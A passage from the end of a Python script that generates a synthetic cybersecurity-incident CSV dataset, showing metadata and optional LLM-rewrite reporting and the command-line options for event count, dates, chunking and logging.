                desc_dict["description_user_report"],
                short_log,
            ]
            row = sanitize_row(row)
            writer.writerow(row)

    print(f"Wrote {n_events} events to {outfile}")

    # Write compact metadata JSON file summarizing the generation run
    meta = {
        "generated_at_utc": datetime.now(tz=timezone.utc)
        .isoformat()
        .replace("+00:00", "Z"),
        "n_events": n_events,
        "outfile": outfile,
        "use_llm_for_generator": USE_LLM_FOR_GENERATOR,
        "llm_backend": os.getenv("NLP_TRIAGE_LLM_BACKEND", "").strip(),
        "llm_rewrites_attempted": GEN_LLM_REWRITE_ATTEMPTED,
        "llm_rewrites_applied": GEN_LLM_REWRITE_COUNT,
        "label_noise_rate": LABEL_NOISE_RATE,
        "random_seed": 42,
    }
    meta_path = outfile + ".meta.json"
    with open(meta_path, "w", encoding="utf-8") as mf:
        json.dump(meta, mf, indent=2)

    # Compact summary of LLM rewrites, if enabled
    if USE_LLM_FOR_GENERATOR and GEN_LLM_REWRITE_ATTEMPTED > 0:
        print(
            f"LLM rewrites: {GEN_LLM_REWRITE_COUNT} applied / {GEN_LLM_REWRITE_ATTEMPTED} attempted",
            flush=True,
        )

    # Optionally write detailed rewrite report if enabled and non-empty
    if REWRITE_REPORT_ENABLED and REWRITE_REPORT_PATH and REWRITE_REPORT:
        try:
            with open(REWRITE_REPORT_PATH, "w", encoding="utf-8") as rf:
                json.dump(REWRITE_REPORT, rf, indent=2)
            print(f"LLM rewrite report written to {REWRITE_REPORT_PATH}", flush=True)
        except Exception as e:
            if LLM_GENERATOR_DEBUG:
                print(
                    f"[GEN-LLM] Failed to write rewrite report to {REWRITE_REPORT_PATH}: {e}",
                    flush=True,
                )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generate a synthetic cybersecurity incidents dataset with enhanced diversity."
    )
    parser.add_argument(
        "--n-events",
        type=int,
        default=300000,
        help="Number of events to generate (default: 300000 for better model generalization).",
    )
    parser.add_argument(
        "--outfile",
        type=str,
        default="data/cyber_incidents_simulated.csv",
        help="Output CSV path (default: data/cyber_incidents_simulated.csv).",
    )
    parser.add_argument(
        "--use-llm",
        dest="use_llm",
        action="store_true",
        help="Enable LLM-based narrative rewrites (overrides NLP_TRIAGE_LLM_GENERATOR env var).",
    )
    parser.add_argument(
        "--no-llm",
        dest="use_llm",
        action="store_false",
        help="Disable LLM-based narrative rewrites (overrides NLP_TRIAGE_LLM_GENERATOR env var).",
    )
    parser.add_argument(
        "--rewrite-report",
        type=str,
        default=None,
        help="Optional JSON path to write a detailed LLM rewrite report (before/after for each rewritten event).",
    )
    parser.add_argument(
        "--start-date",
        type=str,
        default="2024-01-01",
        help="Start date for events in YYYY-MM-DD format (default: 2024-01-01).",
    )
    parser.add_argument(
        "--end-date",
        type=str,
        default="2024-12-31",
        help="End date for events in YYYY-MM-DD format (default: 2024-12-31).",
    )
    parser.add_argument(
        "--chunk-size",
        type=int,
        default=1000,
        help="Number of events to write per chunk (default: 1000).",
    )
    parser.add_argument(
        "--checkpoint-file",
        type=str,
        default=None,
        help="Path to checkpoint file for resuming generation (default: disabled).",
    )
    parser.add_argument(
        "--log-file",
        type=str,
        default=None,
        help="Path to log file for detailed progress logging (default: console only).",
    )
    # Default to the environment-configured behavior unless explicitly overridden
    parser.set_defaults(use_llm=USE_LLM_FOR_GENERATOR)

    args = parser.parse_args()

    # Configure optional rewrite reporting
    if args.rewrite_report:
        REWRITE_REPORT_ENABLED = True
        REWRITE_REPORT_PATH = args.rewrite_report

    # Override the module-level flag so llm_rewrite_descriptions() sees the CLI choice.
    USE_LLM_FOR_GENERATOR = args.use_llm

    # Initialize LLM if needed before generation starts
    if args.use_llm:
        initialize_llm_if_needed()

    generate_events(
        n_events=args.n_events,
        outfile=args.outfile,
        start_date=args.start_date,
        end_date=args.end_date,
        chunk_size=args.chunk_size,
        checkpoint_file=args.checkpoint_file,
        log_file=args.log_file,
        rewrite_report=args.rewrite_report,
    )
